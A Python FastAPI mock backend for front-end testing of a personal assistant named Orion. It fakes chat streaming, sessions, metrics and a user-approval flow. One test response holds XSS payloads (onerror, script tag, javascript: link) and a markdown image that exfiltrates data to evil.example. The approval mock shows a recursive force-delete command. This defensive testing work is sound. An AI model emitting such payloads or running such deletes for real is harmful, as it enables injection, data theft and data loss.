"""Backend de mentira para desenvolver e testar o front sem Qdrant/SurrealDB/modelos.

Imita os contratos do legado (`/sessoes`, `/historico`, `/metrics`, `/stats`, `/health`,
`/integracoes`, `/grafo/completo`, `/chat` em SSE...) e os eventos novos do `orion.app`
(`tool`, `approval`, `error` + `/approvals`). Serve também o próprio front em `/ui/`.

    uv run python -m tests.front_e2e.mock_backend          # http://127.0.0.1:8000
    MOCK_PORT=8123 MOCK_TOKEN= uv run python -m tests.front_e2e.mock_backend
"""

from __future__ import annotations

import asyncio
import json
import math
import os
import random
import secrets
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

import uvicorn
from fastapi import FastAPI, File, Header, HTTPException, UploadFile
from fastapi.responses import JSONResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles

FRONT = Path(__file__).resolve().parents[2] / "Orion_Core" / "Front_end_Orion"
TOKEN = os.environ.get("MOCK_TOKEN", "")  # vazio = sem auth (como o legado)

ESTADO: dict[str, Any] = {
    "mudo": False,
    "latencia": 1840,
    "chats": 128,
    "aprovacoes": {},
    "sessao_ativa": "s1",
    "rng": random.Random(7),
    "delay": 0.018,
}


def _agora() -> datetime:
    return datetime.now().replace(microsecond=0)


def _sessoes() -> list[dict[str, Any]]:
    a = _agora()
    base = [
        ("s1", "Plano da fase 0: exportar os dados", a - timedelta(minutes=18)),
        ("s2", "Memória nova em SQLite com busca híbrida", a - timedelta(hours=5)),
        ("s3", "Dúvida de UML: diagrama de classes vs. sequência", a - timedelta(days=1, hours=2)),
        ("s4", "Backup diário do vault no iCloud", a - timedelta(days=2, hours=6)),
        ("s5", "Bot do Telegram com botões de aprovar", a - timedelta(days=4)),
        ("s6", "Resumo do PDF de Engenharia de Software", a - timedelta(days=9)),
        ("s7", "Ideias para a voz masculina do Orion", a - timedelta(days=21)),
    ]
    itens = [
        {
            "sessao_id": sid,
            "titulo": titulo,
            "criada": criada.isoformat(),
            "ativa": sid == ESTADO["sessao_ativa"],
            "favorita": False,
        }
        for sid, titulo, criada in base
    ]
    itens.append(
        {
            "sessao_id": "legado",
            "titulo": "conversas antigas (pré-sessões)",
            "criada": "",
            "ativa": False,
            "somente_leitura": True,
        }
    )
    return itens


RESPOSTA_XSS = """\
Teste de ataque (nada disto pode executar nem sair do app):

<img src=x onerror="window.__pwned=1">
<script>window.__pwned=2</script>

[clique aqui](javascript:window.__pwned=3)

![exfiltração](https://evil.example/leak?d=segredo)

[link legítimo](https://exemplo.com/pagina)
"""

RESPOSTA_LONGA = """\
Claro. Aqui está o plano da **fase 0**, em ordem de risco:

1. Rodar `backup_memoria` no PC e conferir as contagens.
2. Copiar `Orion_Ollama/.env` e `Orion_Core/google_auth/` para um lugar seguro.
3. Abrir o vault do Obsidian e confirmar que sincronizou.

## O que cada tabela guarda

| Tabela | Conteúdo | Vai para a memória nova? |
|---|---|---|
| `evento` | conversas | sim |
| `sessao` | sessões | sim |
| `lembrete` | lembretes | depois |
| `prompt` | prompts salvos | depois |

Para conferir o export, este trecho mostra as contagens:

```python
import json
from pathlib import Path

pasta = Path("backup")
for arq in sorted(pasta.glob("*.json")):
    dados = json.loads(arq.read_text(encoding="utf-8"))
    print(f"{arq.stem:<12} {len(dados):>7} registros")
```

> Só apague qualquer coisa do PC **depois** de abrir os arquivos de export e ver os números.

Detalhes em [ORION_NUCLEO.md](https://github.com/antoniossalomao/Orion) e [a documentação do SQLite](https://sqlite.org/fts5.html).
Quer que eu monte o roteiro em formato de checklist?
"""

RESPOSTA_CURTA = "Entendido, Antônio. Estou pronto para o que vier."

HISTORICOS: dict[str, list[tuple[str, str]]] = {
    "s1": [
        ("user", "Qual é o plano para a fase 0 antes de eu vender o PC?"),
        ("assistant", RESPOSTA_LONGA),
        ("user", "Perfeito. E o vault do Obsidian?"),
        (
            "assistant",
            "O vault já está no iCloud; só **confira a sincronização** antes de formatar.\n\n- Abra o app no celular.\n- Veja se a nota mais recente aparece.\n- Anote a data da última sincronização.",
        ),
    ],
    "s2": [
        ("user", "Explique a busca híbrida da memória nova"),
        (
            "assistant",
            "A busca combina **FTS5** (palavra-chave) e **vetores** com fusão por RRF:\n\n```sql\nSELECT t.id, bm25(facts_fts) AS rank\nFROM facts_fts JOIN facts t ON t.id = facts_fts.rowid\nWHERE facts_fts MATCH ?\nORDER BY rank\nLIMIT 10;\n```\n\nSe o embedder cair, a busca segue só por palavra-chave.",
        ),
    ],
}


def _historico(sid: str) -> list[dict[str, Any]]:
    t = _agora() - timedelta(minutes=40)
    saida = []
    for i, (papel, texto) in enumerate(
        HISTORICOS.get(sid, [("user", "Oi, Orion."), ("assistant", RESPOSTA_CURTA)])
    ):
        saida.append(
            {
                "role": papel,
                "content": texto,
                "timestamp": (t + timedelta(minutes=i * 2)).isoformat(),
            }
        )
    return saida


def _grafo(limite: int) -> dict[str, Any]:
    rng = random.Random(3)
    temas = [
        "memória",
        "sqlite",
        "telegram",
        "tailscale",
        "voz",
        "python",
        "fase 0",
        "mcp",
        "backup",
        "notebook",
        "obsidian",
        "agenda",
        "uml",
        "java",
        "unimar",
        "orion",
    ]
    frases = [
        "Exportar as tabelas pessoais antes da venda do PC",
        "Memória nova em SQLite com busca híbrida",
        "Bot do Telegram como canal principal no celular",
        "Acesso de fora pela rede do Tailscale",
        "Voz masculina com palavra de ativação",
        "Backup diário do arquivo de memória",
        "Diagrama de classes mostra herança e associação",
        "Resumo do capítulo sobre padrões de projeto",
    ]
    nodes = [{"id": f"topico:{t}", "tipo": "topico", "label": t} for t in temas]
    links: list[dict[str, str]] = []
    n = min(limite, 90)
    agora = _agora()
    for i in range(n):
        eid = f"evento:e{i}"
        nodes.append(
            {
                "id": eid,
                "tipo": "evento",
                "label": frases[i % len(frases)],
                "ator": "Antônio" if i % 2 == 0 else "Orion",
                "ts": (agora - timedelta(hours=i * 3)).isoformat(),
            }
        )
        for k in range(rng.choice([1, 2, 2, 3])):
            links.append(
                {
                    "source": eid,
                    "target": f"topico:{temas[(i * 3 + k * 5) % len(temas)]}",
                    "rel": "sobre",
                }
            )
        if i:
            links.append({"source": eid, "target": f"evento:e{i - 1}", "rel": "precedeu"})
    return {"nodes": nodes, "links": links, "total_nodes": len(nodes), "total_links": len(links)}


def _sse(obj: dict[str, Any] | str) -> str:
    corpo = obj if isinstance(obj, str) else json.dumps(obj, ensure_ascii=False)
    return f"data: {corpo}\n\n"


async def _pedacos(texto: str, delay: float):
    i = 0
    while i < len(texto):
        n = ESTADO["rng"].choice([2, 3, 4, 6, 9])
        yield texto[i : i + n]
        i += n
        await asyncio.sleep(delay)


def _auth(authorization: str | None) -> None:
    if TOKEN and (authorization or "").removeprefix("Bearer ").strip() != TOKEN:
        raise HTTPException(401, "token inválido")


def create_app() -> FastAPI:
    app = FastAPI(title="Orion (mock)")

    @app.get("/api-info")
    def info() -> dict[str, Any]:
        return {"mock": True, "token": bool(TOKEN)}

    @app.get("/health")
    def health() -> dict[str, Any]:
        return {
            "cerebro": {"ok": True, "embedder": True, "bm25": True},
            "qdrant": {"ok": True, "latencia_ms": 4.2, "vetores": {"orion_memory": 3_091_204}},
            "surreal": {"ok": True, "latencia_ms": 11.8},
            "vram": {"usada_mb": 3120, "total_mb": 8192, "gpu_pct": 22},
            "latencia_ultimo_chat_ms": ESTADO["latencia"],
        }

    @app.get("/")
    def raiz() -> dict[str, Any]:
        return {"servico": "Orion cerebro_maestro (mock)", "ativo": True, "versao": "2.1"}

    @app.get("/metrics")
    def metrics() -> dict[str, Any]:
        t = time.time()
        ESTADO["latencia"] = int(1800 + 900 * math.sin(t / 7) + ESTADO["rng"].randint(-120, 120))
        return {
            "latencia_ms": ESTADO["latencia"],
            "cpu_pct": round(28 + 18 * math.sin(t / 5) + ESTADO["rng"].random() * 6, 1),
            "ram_pct": round(61 + 3 * math.sin(t / 30), 1),
            "gpu_pct": int(20 + 15 * math.sin(t / 9) ** 2 * 3),
            "vram_pct": 38,
        }

    @app.get("/stats")
    def stats() -> dict[str, Any]:
        return {
            "total_chats": ESTADO["chats"],
            "iniciado_em": _agora().isoformat(),
            "tiers": {
                "Groq": {"usos": 91, "falhas": 4, "latencia_media_ms": 1210, "taxa_sucesso": 95.8},
                "Gemini": {
                    "usos": 29,
                    "falhas": 1,
                    "latencia_media_ms": 2480,
                    "taxa_sucesso": 96.7,
                },
                "Claude": {
                    "usos": 8,
                    "falhas": 0,
                    "latencia_media_ms": 7320,
                    "taxa_sucesso": 100.0,
                },
            },
            "distribuicao_pct": {"Groq": 71.1, "Gemini": 22.7, "Claude": 6.2},
        }

    @app.get("/stats/historico")
    def stats_historico(limite: int = 48) -> dict[str, Any]:
        base = 40
        return {"snapshots": [{"total_chats": base + i * 2 + (i % 5)} for i in range(limite)]}

    @app.get("/integracoes")
    def integracoes() -> dict[str, Any]:
        return {
            "telegram": {"online": True, "status": "bot rodando"},
            "voz_live": {"online": False, "status": "pronta — clique no botão de voz live"},
            "mic": {"online": False, "status": "mic_engine.py parado"},
            "tts": {
                "online": not ESTADO["mudo"],
                "status": "mudo" if ESTADO["mudo"] else "respondendo por voz",
            },
            "enxame": {"online": True, "status": "disponível via /enxame"},
            "upload": {"online": True, "status": "imagem · áudio · vídeo"},
        }

    @app.get("/memoria/categorias")
    def categorias() -> dict[str, Any]:
        return {
            "total_colecao": 3_091_204,
            "categorias_distintas": 5,
            "por_categoria": {
                "episodio": 1_204,
                "conhecimento_geral": 1_112_246,
                "conversa_geral": 1_001_379,
                "programacao": 238_857,
                "instrucao_ptbr": 325_410,
            },
        }

    @app.get("/grafo/completo")
    def grafo(limite: int = 300) -> dict[str, Any]:
        return _grafo(limite)

    @app.get("/sessoes")
    def sessoes() -> dict[str, Any]:
        itens = _sessoes()
        return {"total": len(itens), "sessoes": itens, "ativa": ESTADO["sessao_ativa"]}

    @app.post("/sessoes")
    def sessao_nova() -> dict[str, Any]:
        ESTADO["sessao_ativa"] = "s1"
        return {"ok": True, "sessao_id": "s1"}

    @app.post("/sessoes/ativar")
    def sessao_ativar(corpo: dict[str, Any]) -> dict[str, Any]:
        sid = corpo.get("sessao_id", "s1")
        ESTADO["sessao_ativa"] = sid
        return {"ok": True, "sessao_id": sid, "mensagens": _historico(sid)}

    @app.get("/historico")
    def historico(sessao: str | None = None) -> dict[str, Any]:
        msgs = _historico(sessao or ESTADO["sessao_ativa"])
        return {"total": len(msgs), "mensagens": msgs}

    @app.delete("/historico")
    def historico_limpar() -> dict[str, Any]:
        return {"ok": True, "mensagem": "Histórico em memória limpo."}

    @app.get("/exportar")
    def exportar() -> dict[str, Any]:
        msgs = _historico(ESTADO["sessao_ativa"])
        md = "\n\n".join(
            f"**{'Antônio' if m['role'] == 'user' else 'Orion'}**: {m['content']}" for m in msgs
        )
        return {"markdown": f"# Conversa com o Orion\n\n{md}", "total_msgs": len(msgs)}

    @app.post("/tts/mudo")
    def tts_mudo(corpo: dict[str, Any]) -> dict[str, Any]:
        ESTADO["mudo"] = bool(corpo.get("mudo"))
        return {"ok": True, "tts_mudo": ESTADO["mudo"]}

    @app.post("/tts/falar")
    def tts_falar(corpo: dict[str, Any]) -> dict[str, Any]:
        return {"ok": True}

    @app.post("/upload")
    async def upload(file: UploadFile = File(...)) -> dict[str, Any]:  # noqa: B008
        dados = await file.read()
        return {
            "ok": True,
            "path": f"C:\\Orion\\cache\\uploads\\{file.filename}",
            "nome": file.filename,
            "bytes": len(dados),
        }

    # ── chat ───────────────────────────────────────────────────────────────
    @app.post("/chat")
    async def chat(
        corpo: dict[str, Any], authorization: str | None = Header(default=None)
    ) -> StreamingResponse:
        _auth(authorization)
        texto = str(corpo.get("texto", ""))
        baixo = texto.lower()

        async def gerar():
            ESTADO["chats"] += 1
            if "falha" in baixo:
                yield _sse({"error": "nenhum modelo respondeu: gateway indisponível"})
                yield _sse("[DONE]")
                return
            yield _sse(
                {
                    "tier": "Groq"
                    if corpo.get("modelo") in (None, "auto", "groq")
                    else str(corpo["modelo"]).title()
                }
            )
            if "apag" in baixo or "aprov" in baixo or "comando" in baixo:
                aid = secrets.token_urlsafe(6)
                args = {"cmd": "Remove-Item C:\\Users\\anton\\Downloads\\antigos -Recurse -Force"}
                ESTADO["aprovacoes"][aid] = {"status": "pending", "args": args}
                yield _sse(
                    {
                        "tool": {
                            "name": "executar_comando",
                            "decision": "confirm",
                            "reason": "execução fora da lista de leitura segura",
                        }
                    }
                )
                yield _sse(
                    {
                        "approval": {
                            "id": aid,
                            "tool": "executar_comando",
                            "reason": "execução fora da lista de leitura segura: 'remove-item' fora da lista de leitura segura",
                            "args": args,
                        }
                    }
                )
                if (
                    "devagar" in baixo
                ):  # a aprovação chega e o texto final demora: simula o clique cedo
                    await asyncio.sleep(1.5)
                async for p in _pedacos(
                    "Preciso da sua **aprovação** para rodar esse comando. Aprove ou negue pelo cartão acima.",
                    ESTADO["delay"],
                ):
                    yield _sse({"text": p})
                yield _sse("[DONE]")
                return
            if "memória" in baixo or "memoria" in baixo or "lembra" in baixo:
                yield _sse({"tool": {"name": "buscar_memoria", "decision": "allow", "reason": ""}})
                await asyncio.sleep(0.5)
            resposta = (
                RESPOSTA_XSS
                if "xss" in baixo
                else (RESPOSTA_CURTA if len(texto) < 12 else RESPOSTA_LONGA)
            )
            if "lento" in baixo:
                await asyncio.sleep(2.5)
            async for p in _pedacos(resposta, ESTADO["delay"]):
                yield _sse({"text": p})
            yield _sse("[DONE]")

        return StreamingResponse(gerar(), media_type="text/event-stream")

    @app.get("/approvals")
    def aprovacoes(authorization: str | None = Header(default=None)) -> list[dict[str, Any]]:
        _auth(authorization)
        return [
            {
                "id": k,
                "tool": "executar_comando",
                "reason": "execução fora da lista de leitura segura",
                **v,
            }
            for k, v in ESTADO["aprovacoes"].items()
            if v["status"] == "pending"
        ]

    @app.post("/approvals/{aid}/decide")
    def decidir(
        aid: str, corpo: dict[str, Any], authorization: str | None = Header(default=None)
    ) -> dict[str, Any]:
        _auth(authorization)
        a = ESTADO["aprovacoes"].get(aid)
        if not a:
            raise HTTPException(404, "aprovação inexistente")
        if a["status"] != "pending":
            raise HTTPException(409, f"aprovação não está pendente ({a['status']})")
        a["status"] = "approved" if corpo.get("approved") else "denied"
        return {"id": aid, "status": a["status"]}

    @app.post("/approvals/{aid}/resume")
    async def retomar(
        aid: str, authorization: str | None = Header(default=None)
    ) -> StreamingResponse:
        _auth(authorization)
        a = ESTADO["aprovacoes"].get(aid)

        async def gerar():
            if not a or a["status"] != "approved":
                yield _sse({"error": "aprovação não está aprovada"})
                yield _sse("[DONE]")
                return
            a["status"] = "consumed"
            yield _sse(
                {"tool": {"name": "executar_comando", "decision": "allow", "approved": True}}
            )
            async for p in _pedacos(
                "Feito. Removi a pasta `antigos` de Downloads (42 arquivos, 1,3 GB).",
                ESTADO["delay"],
            ):
                yield _sse({"text": p})
            yield _sse("[DONE]")

        return StreamingResponse(gerar(), media_type="text/event-stream")

    @app.exception_handler(HTTPException)
    async def _http(_req, exc: HTTPException):
        return JSONResponse({"detail": exc.detail}, status_code=exc.status_code)

    app.mount("/ui", StaticFiles(directory=str(FRONT), html=True), name="front")
    return app


app = create_app()

if __name__ == "__main__":
    uvicorn.run(
        app, host="127.0.0.1", port=int(os.environ.get("MOCK_PORT", "8000")), log_level="warning"
    )
